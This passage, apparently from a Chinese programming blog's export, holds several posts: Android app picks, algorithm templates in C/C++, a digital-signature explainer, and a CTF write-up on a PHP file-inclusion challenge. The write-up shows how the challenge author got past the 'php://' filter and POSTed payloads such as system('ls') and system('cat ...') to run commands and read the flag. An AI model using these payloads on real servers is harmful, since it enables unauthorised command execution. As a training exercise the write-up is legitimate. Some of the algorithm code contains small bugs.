<h2 id="安卓端"><a href="#安卓端" class="headerlink" title="安卓端"></a>安卓端</h2><h4 id="Via浏览器"><a href="#Via浏览器" class="headerlink" title="- Via浏览器"></a>- Via浏览器</h4><p>一款极其简约的浏览器，是我目前遇到的最简约的浏览器了，而且很轻量，体积不足1MB，但是浏览器该有的功能都有了，支持的插件和脚本也很多，还有一套完美的广告拦截系统<br><img src="http://q.yalexin.top/C545427C9BA0FD672C6613D78A453B19.jpg" alt><br>这是它的 <a href="http://via-app.cn/#/tabBar/home" target="_blank" rel="noopener">插件网</a><br><img src="http://q.yalexin.top/EEC02EAC3A94AC48D266FF52C217D5DD.jpg" alt><br><a href="http://viayoo.com/zh-cn/" target="_blank" rel="noopener">Via官网</a><br>也可以<a href="Via.apk">点此下载</a></p>
<h4 id="Dir"><a href="#Dir" class="headerlink" title="- Dir"></a>- Dir</h4><p>这是一款垃圾清理的工具，真就是除了清理垃圾就没有其他臃肿的功能了<br><img src="http://q.yalexin.top/4888C591C6EB238D6CA5A29EC99B5957.jpg" alt><br>好吧，原来是我没有看清除（qiong），高级版的功能还是相当不错的，可以有效防止国内一些流氓软件了，不过该功能要谨慎使用，否则误删了系统文件而且导致系统崩溃<br><img src="http://q.yalexin.top/3AB2908779F1FBAE43E5B3B7B938DD68.jpg" alt><br>这是Google Play <a href="https://play.google.com/store/apps/details?id=kh.android.dir" target="_blank" rel="noopener">链接</a><br>也可以<a href="Dir.apk">点此下载</a></p>
<h4 id="Snapmod"><a href="#Snapmod" class="headerlink" title="- Snapmod"></a>- Snapmod</h4><p>这是一款把截图带上手机边框的软件,原理就是将截图按照一定的比例进行缩放,也正因为如此,安装应用后第一件事就是下载自己手机对应的机型<br><img src="http://q.yalexin.top/1A5A0DBD71AABBFFB7F1A49D81126DAA.jpg" alt><br>如果找不到的话就以自己的手机屏幕分辨率为基础,按照自己的爱好选择现有的机型下载,不过现在适配的机型也挺多的</p>
<img src="/2020/02/23/%E5%B0%8F%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/0377AFF02DAA787A7579289E2A11626F.jpg" class>
<p>** 不过要注意,假如强行选用非自己手机分辨率的机型,会造成图片变形 **<br>这是Snapmod的<a href="https://coolapk.com/apk/cn.gavinliu.snapmod" target="_blank" rel="noopener">酷安链接</a><br>也可以<a href="Snapmod.apk">点此下载</a></p>
<h4 id="网速指示计"><a href="#网速指示计" class="headerlink" title="- 网速指示计"></a>- 网速指示计</h4><p>不过说实话这款应用对于华为、小米、OPPO、VIVO等手机可能不太适用,因为这些手机厂商的系统基于Android系统上都自带实时网速的功能,所以这款应用适用于运行原生安卓或者自身系统不带网速显示的手机<br><img src="http://q.yalexin.top/0377AFF02DAA787A7579289E2A11626F.jpg" alt><br>这是Google Play <a href="https://play.google.com/store/apps/details?id=me.zheteng.android.powerstatus" target="_blank" rel="noopener">链接</a><br>也可以<a href="网速指示计.apk">点此下载</a>网速指示计.apk)</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>效率</tag>
        <tag>分享</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>序列自动机模板</title>
    <url>/2021/04/10/%E5%BA%8F%E5%88%97%E8%87%AA%E5%8A%A8%E6%9C%BA%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="算法背景"><a href="#算法背景" class="headerlink" title="算法背景"></a>算法背景</h2><p>子序列的匹配，当然如果只是少量的模式串，直接使用双指针进行模拟即可，如果遇到大量模式串需要进行匹配，那么可以为主串维护一个DFA，对每一个模式串匹配时间复杂度都是<code>O(n)</code>.</p>
<p>算法的大致思想是为每一个主串的字符节点创建一个下一个字符的索引节点，方便状态快速转换。<a id="more"></a></p>
<h2 id="算法模板"><a href="#算法模板" class="headerlink" title="算法模板"></a>算法模板</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 初态是 0 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nxt[MAX_N + <span class="number">1</span>][<span class="number">27</span>];</span><br><span class="line">    <span class="keyword">int</span> strLen = s.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; i++) nxt[strLen][i] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = s.length(); i; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) nxt[i - <span class="number">1</span>][j] = nxt[i][j];</span><br><span class="line">        nxt[i - <span class="number">1</span>][s[i - <span class="number">1</span>] - <span class="string">'a'</span>] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>“算法”</tag>
        <tag>自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>康托展开C++实现</title>
    <url>/2020/09/13/%E5%BA%B7%E6%89%98%E5%B1%95%E5%BC%80C-%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>康托展开是一个全排列到一个自然数的双射，常用于构建哈希表时的空间压缩。 康托展开的实质是计算当前排列在所有由小到大全排列中的顺序，因此是可逆的。<a id="more"></a></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 康托展开</span></span><br><span class="line"><span class="comment">* num[]: 全排列序列（下标从1开始）</span></span><br><span class="line"><span class="comment">* LEN ：全排列长度 </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cantor</span><span class="params">(<span class="keyword">int</span> num[], LEN)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>,sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; LEN;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt;= LEN;j++)</span><br><span class="line">            <span class="keyword">if</span>(num[j] &lt; num[i])</span><br><span class="line">                sum++;</span><br><span class="line">        ans += sum * factorial[LEN - i];</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 康托逆展开</span></span><br><span class="line"><span class="comment">* index: 全排列索引</span></span><br><span class="line"><span class="comment">* LEN ：全排列长度 </span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decantor</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> LEN)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;mySet = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> div, mod, j;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= LEN;i++)&#123;</span><br><span class="line">        div = index / factorial[LEN - i];</span><br><span class="line">        mod = index % factorial[LEN - i];</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>,it = mySet.<span class="built_in">begin</span>();j &lt; div;j++)it++;</span><br><span class="line">        num[i] = *it;</span><br><span class="line">        mySet.erase(it);</span><br><span class="line">        index = mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>映射</tag>
        <tag>康托展开</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界Web_php_include题解</title>
    <url>/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>题目地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1" target="_blank" rel="noopener"><code>Web_php_include</code></a></p>
<p>打开场景后，是<code>index.php</code>的源码：<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大概解读一下，首先获取参数<code>hello</code>并将其值输出，然后获取<code>page</code>参数的值，接着如果<code>page</code>参数中如果包含<code>php://</code>子串，则将其替换，直至不再包含该子串；然后将替换后的参数值作为文件名，将其文件引入到<code>index.php</code>中。</p>
<p>思路：二话不说，先用御剑扫描工具扫一下，看看有哪些可以访问的，然后发现一个后台登录地址，原本想爆破密码的，但是想了想，题目是说<code>include</code>，所以应该不是爆破密码。</p>
<p>应该还是从源码中的<code>include</code>下手，当然了我们得先绕过替换字符串的代码，我们可以用大写的<code>PHP</code>进行代替<code>php</code>，然后我又去搜了一下<code>php include</code>漏洞，发现还真不少，其中有一个比较适合：</p>
<p>以<code>POST</code>方式提交代码片段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将会在 <code>index.php</code>所在文件下的文件 <code>shell.php</code> 内增加 <code>&lt;?php phpinfo();?&gt;</code> 一句话</p>
<p>不过得有两个条件:</p>
<ul>
<li><p><code>allow_url_include = On</code></p>
</li>
<li><p>对 <code>allow_url_fopen</code>不做要求。</p>
</li>
</ul>
<p>结合本题，我们应该构造下面的请求：</p>
<p><img src="/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/D:%5CjsProject%5Chexo-blog-files%5Csource_posts%5C%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3%5Cimage-20220520115557474.png" alt="image-20220520115557474"></p>
<p>提交过后，果然在页面中获取了很多信息。</p>
<p>那我们看看当前目录下都有哪些文件吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们发现了一个文件：<code>fl4gisisish3r3.php</code></p>
<p>好！我们输出看一下里边的内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'cat fl4gisisish3r3.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>果然获取了<code>flag</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>include漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>数字签名背后原理</title>
    <url>/2022/10/26/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E8%83%8C%E5%90%8E%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>最近在学习区块链的知识，觉得其中的数字签名挺有意思的，想了解一下背后的大致数学原理。当然了，数字签名有很多种，一般采用非对称密钥密码体制来实现，常见的非对称加密算法有<code>RSA</code>和椭圆曲线加密算法，下面记录一下基于这两种算法的数字签名大致原理,注意，本文并不是在强调如何调用高级<code>API</code>，而是打算从数学原理出发。</p>
<a id="more"></a>

<h2 id="RSA数字签名"><a href="#RSA数字签名" class="headerlink" title="RSA数字签名"></a>RSA数字签名</h2><p>该算法的数字签名原理比较简单，在此之前，我希望你了解一下什么是<code>RSA</code>算法，可以在之前的<a href="https://www.yalexin.top/blog/blog/110" target="_blank" rel="noopener">【文章】</a>中找到该算法的介绍。</p>
<p>假设阿珍和阿强在通信，双方持有自己的私钥和对方的公钥。</p>
<p>在之前的<a href="https://www.yalexin.top/blog/blog/110" target="_blank" rel="noopener">【文章】</a>中，我们证明了<br>$$<br>m^{e*d}\equiv m\pmod{n} \tag{1}<br>$$<br>其中<code>&lt;e,n&gt;</code>作为公钥，<code>&lt;d,n&gt;</code>作为对应的私钥。</p>
<p>同时假设<code>&lt;e,n&gt;</code>是阿强的私钥，<code>&lt;d,n&gt;</code>是其公钥，公钥在阿珍手上有相应的一份副本。</p>
<p>先来整理一下流程：阿强准备发送的消息是”我是阿强，我喜欢你！”，然后在后面附上了他的签名，接着将消息和签名进行简单整合:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    message: "xxx",</span><br><span class="line">    signature: "yyy"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用阿珍的公钥进行加密，然后传输到阿珍，阿珍收到了，利用她的私钥解密，是可以还原到原消息和一个签名。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    message: "xxx",</span><br><span class="line">    signature: "yyy"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传输过程加密解密我们不关心，因为在之前介绍<code>RSA</code>的时候介绍过了，这里说一下签名的原理。</p>
<p>假设<code>m</code>是“我是阿强，我喜欢你！”的哈希值，阿强利用私钥对其求下面的式子：<br>$$<br>c=m^d\pmod{n}<br>$$<br>阿珍解密传输信息后，一定可以解析到<code>signature: &quot;yyy&quot;</code>的，即可以获得到$c$。</p>
<p>阿珍要验证这句话是不是阿强说的，万一是隔壁老王说的呢，是吧？毕竟隔壁老王那里也有她的<strong>公钥</strong>呢。</p>
<p>验证过程很简单，她手上有阿强的公钥，她做一下运算：<br>$$<br>m1=c^e\pmod{n}=m^{d<em>e}\pmod{n}\tag{2}<br>$$<br>根据式子（1）,我们很容易可以得到：<br>$$<br>m1=m\pmod{n}<br>$$<br>因此她直接将之前得到的消息计算哈希值，跟数字签名部分进行对比，二者一致，*</em>则说明该消息的确是由阿强发出的**，因为计算签名值的过程需要用到阿强的私钥，而该私钥只有他自己本人有，==这就达到了防伪造的目的==。</p>
<p>实际上，如果我们把流程再次简化，即阿强向大家（其他人有阿强的公钥）宣布“我是阿强，我喜欢阿珍！”，其他人收到消息后，只要利用阿强的公钥计算，即可验证阿强一定有说过这句话，无法抵赖！</p>
<h2 id="椭圆曲线算法数字签名"><a href="#椭圆曲线算法数字签名" class="headerlink" title="椭圆曲线算法数字签名"></a>椭圆曲线算法数字签名</h2><p>在此之前，我们先来了解一下<a href="https://zhuanlan.zhihu.com/p/143122476" target="_blank" rel="noopener">【椭圆曲线加密原理】</a>，其也是利用了“根据公钥，难以反推私钥”来达到安全目的，相比于<code>RSA</code>，可以使用更短的密钥实现同等的安全强度，区块链中用的数字签名算法就是椭圆曲线加密算法。</p>
<p> 假设还是刚刚的阿强和阿珍的场景，阿强的私钥为$k_a$，公钥为$p_a=k_a\cdot G$.</p>
<h3 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h3><p>该过程由阿强完成，流程如下：</p>
<ol>
<li>先随机产生一对公私钥，即$K$和$P=K\cdot G$</li>
<li>然后将随机产生的公钥的X坐标拿出来，即$r=x_P \pmod {n}$。</li>
<li>计算$S=(K^{-1}(hash(m)+k_a \cdot r)) \pmod{n}$，其中$K^{-1}\cdot K=1\pmod{n}$的逆元。</li>
<li>$r$和$S$作为签名结果。</li>
</ol>
<h3 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h3><p>该过程由阿珍完成，流程如下：</p>
<ol>
<li>计算$\alpha=(S^{-1}\cdot hash(m))\pmod{n}$</li>
<li>计算$\beta=(S^{-1}\cdot r)\pmod{n}$</li>
<li>计算$Y=(\alpha \cdot G+\beta \cdot p_a)\pmod{n}$</li>
<li>如果点$Y$的X坐标和$r$相同，则验证通过</li>
</ol>
<p>下面我们来证明第四点：</p>
<p>对于签名过程的第3点的式子，我们两边同乘$S^{-1}\cdot K$，得到<br>$$<br>K=(S^{-1}\cdot(hash(m)+k_a\cdot r))\pmod{n}\tag{3}<br>$$<br>继续将验证过程的第一点第二点代入到第三点中，有：<br>$$<br>Y=(S^{-1}(hash(m)\cdot G+r\cdot p_a))\pmod{n}<br>$$<br>同时注意到，$p_a=k_a\cdot G$，代入到上市，有<br>$$<br>Y=(S^{-1}(hash(m)+r\cdot k_a)\cdot G)\pmod{n} \tag{4}<br>$$<br>结合式子（3）和式子（4），我们有<br>$$<br>Y=K\cdot G \pmod{n}=P\pmod{n}<br>$$<br>进而证明了第四点。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>数字签名</tag>
      </tags>
  </entry>
  <entry>
    <title>最小点对</title>
    <url>/2020/04/02/%E6%9C%80%E5%B0%8F%E7%82%B9%E5%AF%B9/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>对于给定的n个点，求出这些点的最小的距离。</p>
<h2 id="解法一：暴力法"><a href="#解法一：暴力法" class="headerlink" title="解法一：暴力法"></a>解法一：暴力法</h2><p>遍历任意两点之间的距离，找出最小值。<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 20:37:23</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 21:23:54</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">distance</span><span class="params">(<span class="keyword">double</span> x1, <span class="keyword">double</span> y1, <span class="keyword">double</span> x2, <span class="keyword">double</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">&#125; mPoint;</span><br><span class="line">mPoint p[<span class="number">120</span>], mid[<span class="number">120</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf %lf"</span>, &amp;p[i].x, &amp;p[i].y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">double</span> <span class="built_in">min</span> = <span class="number">9999.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">double</span> t = distance(p[i].x, p[i].y, p[j].x, p[j].y);</span><br><span class="line">            <span class="built_in">min</span> = <span class="built_in">min</span> &lt; t ? <span class="built_in">min</span> : t;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lf"</span>, <span class="built_in">min</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算法复杂度是：O（n<sup>2</sup>）</p>
<h2 id="解法二：分治法"><a href="#解法二：分治法" class="headerlink" title="解法二：分治法"></a>解法二：分治法</h2><ol>
<li>先将点集按照x坐标的大小进行排序</li>
<li>递归进行3，4，5步骤</li>
<li>取一条中线，将点集分成左右两部分，尽量把点集分为数量相同的两半，找出左边最小的点距离DL和右边最小的点距离DR，取二者的较小者minD=min(DL,DR)</li>
<li>合并：以中线为中心，半径为minD做圆，将左右两边的点中处于该圆的点保存在一个数组中，求出这些点中的最小距离，关于这个距离，可以先按照y坐标的大小进行排序，接着， 对于每一个点P0(x1,y1)，只要计算出紧接在P0后面的6个点和P0之间的距离，取较小值，该值就是P0和距离DR中的点的最小值（假设P0在DL），计算该数组中的每一个点的最小值，并找出在这里边的最小值m。</li>
<li>取m和minD的较小者，即为所求。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 15:59:50</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 21:03:04</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 交换两个数的宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swap(a, b)    \</span></span><br><span class="line">    &#123;                 \</span><br><span class="line">        mPoint t = a; \</span><br><span class="line">        a = b;        \</span><br><span class="line">        b = t;        \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 计算两个点之间的距离函数</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">distance</span><span class="params">(<span class="keyword">double</span> x1, <span class="keyword">double</span> y1, <span class="keyword">double</span> x2, <span class="keyword">double</span> y2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">point</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> x, y;</span><br><span class="line">&#125; mPoint;</span><br><span class="line">mPoint p[<span class="number">100</span>], mid[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>;</span><br><span class="line">    mPoint key = p[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[j].x &lt;= key.x) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(p[i], p[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(p[l], p[i]);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort_y</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> i = l, j = i + <span class="number">1</span>;</span><br><span class="line">    mPoint key = mid[l];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= r; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mid[j].y &lt;= key.y) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            swap(mid[i], mid[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(mid[l], mid[i]);</span><br><span class="line">    q_sort(l, i - <span class="number">1</span>);</span><br><span class="line">    q_sort(i + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">find_minD</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r - l == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> d1, d2, d3;</span><br><span class="line">        d1 = distance(p[l].x, p[l].y, p[r + <span class="number">1</span>].x, p[r + <span class="number">1</span>].y);</span><br><span class="line">        d2 = distance(p[l].x, p[l].y, p[r].x, p[r].y);</span><br><span class="line">        d3 = distance(p[l + <span class="number">1</span>].x, p[l + <span class="number">1</span>].y, p[r].x, p[r].y);</span><br><span class="line">        d1 = d1 &lt; d2 ? d1 : d2;</span><br><span class="line">        d1 = d1 &lt; d3 ? d1 : d3;</span><br><span class="line">        <span class="keyword">return</span> d1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l + <span class="number">1</span> == r) &#123;</span><br><span class="line">        <span class="keyword">return</span> distance(p[l].x, p[l].y, p[r].x, p[r].y);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 分别是距离中线距离小于min的点的数量、中线位置</span></span><br><span class="line">        <span class="keyword">int</span> number = <span class="number">0</span>, mid_x = p[(l+r)/<span class="number">2</span>].x;</span><br><span class="line">        <span class="keyword">double</span> Lmin, Rmin, <span class="built_in">min</span>, mid_min = <span class="number">32767</span>;</span><br><span class="line">        Lmin = find_minD(l, (l+r) / <span class="number">2</span>);</span><br><span class="line">        Rmin = find_minD((l+r) / <span class="number">2</span> + <span class="number">1</span>, r);</span><br><span class="line">        <span class="built_in">min</span> = Lmin &lt; Rmin ? Lmin : Rmin;</span><br><span class="line">        <span class="comment">// 以中线为为中心，寻找左右两边中距离中线距离小于等于min的点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((p[i].x - mid_x) &lt; <span class="built_in">min</span>) &#123;</span><br><span class="line">                mid[number++] = p[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将得到的数组根据坐标y的值进行排序 求出该数组中最小点对值</span></span><br><span class="line">        <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            q_sort_y(<span class="number">0</span>, number - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; number; j++) &#123;</span><br><span class="line">                    <span class="keyword">double</span> t = distance(p[i].x, p[i].y, p[j].x, p[j].y);</span><br><span class="line">                    mid_min = mid_min &lt; t ? mid_min : t;</span><br><span class="line">                    <span class="keyword">if</span> (++count &gt; <span class="number">7</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span> &lt; mid_min ? <span class="built_in">min</span> : mid_min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> min_d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) 